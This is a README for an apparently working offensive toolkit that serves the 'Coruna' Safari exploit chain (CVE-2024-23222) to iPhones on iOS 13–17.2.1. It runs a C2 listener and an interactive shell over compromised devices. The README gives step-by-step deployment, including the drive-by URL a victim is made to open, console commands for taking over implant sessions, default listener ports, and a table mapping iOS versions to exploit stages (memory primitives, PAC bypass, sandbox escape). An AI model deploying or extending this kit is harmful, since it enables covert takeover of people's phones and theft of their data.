# iOS Orchestrator — Coruna

Web server, C2 listener, and interactive shell for the **Coruna** exploit chain (CVE-2024-23222). Targets Safari on iOS 13–17.2.1. Drive-by only: the victim opens a single URL in Safari; no reverse shell or custom app required for the browser stage.

## Requirements

- **Python 3.8+**
- Dependencies: `pip install -r requirements.txt`

## Quick start

1. **Config** — Copy `config.json.example` to `config.json` (optional; defaults work for localhost).
2. **Run** — From the `ios_orchestrator` directory: `python main.py`
3. **Target** — On a vulnerable iPhone, open `http://YOUR_IP/coruna/group.html` in Safari (HTTP only; ensure port 80 is reachable).
4. **Shell** — When a session appears, use the console:
   ```
   (coruna)> list
     [abc12345] 192.168.1.10 2024-03-13 14:30:00
   (coruna)> use abc12345
   (shell)> id
   (shell)> exit
   ```

## Console commands

| Command      | Description                |
|-------------|----------------------------|
| `list`      | List active C2 sessions    |
| `use <id>`  | Attach to session shell    |
| `help`      | Show help                  |
| `quit`      | Shut down server and exit  |

## Configuration

Edit `config.json` (create from `config.json.example` if needed):

| Key                    | Description                          | Default        |
|------------------------|--------------------------------------|----------------|
| `c2_bind`              | C2 listener bind address             | `0.0.0.0`      |
| `c2_port`              | C2 listener port                     | `8080`         |
| `web_server_ip`        | Web server bind address               | `0.0.0.0`      |
| `web_server_port`      | Web server port                       | `80`           |
| `exploit_templates_dir`| Path to exploit files (e.g. coruna)   | `exploits/`    |
| `static_files_dir`     | Path for static assets                | `web_server/static/` |

## Project layout

```
ios_orchestrator/
├── main.py                    # Entry point: web server, C2, console loop
├── config.json.example        # Example config (copy to config.json)
├── requirements.txt
├── core/
│   └── config_manager.py      # Config load/save and defaults
├── web_server/
│   ├── exploit_http_server.py # Serves /coruna/ (group.html, Stage1/2/3, payloads)
│   └── static/                # Optional static assets
├── c2_comms/
│   ├── c2_server.py          # C2 TCP listener; attaches sessions
│   └── session.py            # Session state and shell I/O
├── exploits/
│   └── coruna/               # Coruna exploit chain
│       ├── group.html        # Loader: fingerprint, Stage1/2/3 selection
│       ├── platform_module.js
│       ├── utility_module.js
│       ├── Stage1_*.js       # Browser primitives (cassowary, terrorbird, bluebird, jacurutu)
│       ├── Stage2_*.js       # PAC bypass (seedbell variants)
│       ├── Stage3_VariantA.js / Stage3_VariantB.js
│       └── payloads/         # manifest.json, bootstrap.dylib, per-hash dylibs/bins
└── docs/
    ├── CVE-2024-23222_ANALYSIS.md
    ├── REVIEW.md
    ├── REPOS_ANALYSIS.md
    └── THREE_REPOS_FILE_INVENTORY.md
```

## C2 and payloads

- Implants in `exploits/coruna/payloads/` may have a **hardcoded C2** in the binaries. If no session appears after a successful drive-by:
  - Ensure port **8080** is open (or the port you set in `config.json`).
  - The original kit may have used a different C2; the payloads are from the [khanhduytran0/coruna](https://github.com/khanhduytran0/coruna) payload set.
- This project does **not** implement a reverse shell for the initial compromise; the drive-by delivers the chain and the C2 receives connections from the implant.

## Exploit chain (Coruna)

- **Stage 1** — WebKit/JSC exploit (version-dependent): gains arbitrary read/write via WASM-backed primitives.
- **Stage 2** — PAC bypass (Intl.Segmenter / BreakIterator) where applicable.
- **Stage 3** — Sandbox escape and payload delivery: loads `bootstrap.dylib`, feeds payloads from `payloads/manifest.json` and the per-hash directories.

### Vulnerable iOS versions and chains

Version selection is driven by `platform_module.js` (from the device user agent). Each range uses a specific Stage1 → Stage2 → Stage3 path.

#### Stage 1 (browser primitive)

| iOS version   | Flag    | Module        | In repo |
|---------------|---------|---------------|---------|
| **16.6 – 17.2.1** | JtEUci  | cassowary     | ✅ |
| **16.2 – 16.5.1** | KeCRDQ  | terrorbird    | ✅ |
| **15.6 – 16.1.2** | ShQCsB  | bluebird      | ✅ |
| **15.2 – 15.5**   | RbKS6p  | jacurutu      | ✅ |
| **11.0 – 15.1**   | mmrZ0r  | 7d8f5bae…     | ❌ (404) |

#### Stage 2 (PAC bypass)

| iOS version   | Flag     | Module(s) | In repo |
|---------------|----------|-----------|---------|
| **17.0 – 17.2.1**  | wF8NpI   | seedbell_pre → seedbell (17.x)     | ✅ |
| **16.6 – 16.7.12** | LJ1EuL   | seedbell_pre → seedbell (16.6–16.7) | ✅ |
| **16.3 – 16.5.1**  | CpDW_T   | seedbell (16.3–16.5.1)              | ✅ |
| **15.0 – 16.2**    | IqxL92   | breezy15                            | ✅ |
| **13.0 – 14.x**    | (default)| breezy                              | ✅ |

#### Stage 3 (sandbox escape)

| Condition              | Module    |
|-------------------------|-----------|
| wC3yaB set and PAC OK   | VariantA  |
| Otherwise               | VariantB  |

**Example full chains:**

- **iOS 17.0:** cassowary → seedbell_pre + seedbell (17.x) → VariantA or VariantB  
- **iOS 16.5:** terrorbird → seedbell (16.3–16.5.1) → VariantB  
- **iOS 16.7:** cassowary → seedbell_pre + seedbell (16.6–16.7) → VariantB  
- **iOS 15.4:** jacurutu → breezy15 → VariantB  
- **iOS 14.x:** would use mmrZ0r (Stage1) → breezy (Stage2) → VariantB, but **mmrZ0r is missing** (404).

The **mmrZ0r** Stage1 (`7d8f5bae97f37aa318bccd652bf0c1dc38fd8396.js`) for **iOS 11–15.1** is not present in public repos; devices in that range get a 404 for that module. See `docs/REPOS_ANALYSIS.md` and `docs/THREE_REPOS_FILE_INVENTORY.md` for details.

## Credits and references

- Exploit chain and payloads: [khanhduytran0/coruna](https://github.com/khanhduytran0/coruna) (local-hostable, deobfuscated; additional Stage modules from `other/`).
- Analysis and docs: see `docs/` and the repositories listed in `REPOS_ANALYSIS.md`.

## Disclaimer

This project is for **authorized security research and education** only. The vulnerabilities targeted have been patched by Apple. Do not use against systems or users without explicit permission.
